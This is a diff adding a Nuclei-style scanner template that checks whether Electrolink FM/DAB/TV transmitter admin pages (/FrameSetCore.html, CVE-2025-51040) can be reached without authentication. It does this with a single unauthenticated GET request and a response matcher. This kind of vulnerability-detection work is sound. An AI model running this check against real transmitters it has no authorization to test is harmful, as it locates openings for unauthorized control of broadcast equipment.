@@ -1,0 +1,25 @@
+id: electrolink-fm-dab-tv-backend-unauthorized
+
+info:
+  name: "Electrolink-FM-DAB-TV发射机FrameSetCore.html未授权访问"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    Electrolink-FM-DAB-TV系统在/FrameSetCore.html管理界面中缺乏有效的Cookie验证机制，导致访问控制逻辑失效。该安全缺陷允许远程攻击者在未进行身份认证的情况下直接访问管理端点，进而对系统配置和敏感数据实施未经授权的读取与写入操作。
+  reference:
+  - CVE-2025-51040
+  tags: Electrolink-FM-DAB-TV发射机
+
+http:
+- raw:
+  - |
+    GET /FrameSetCore.html HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'STATUS'
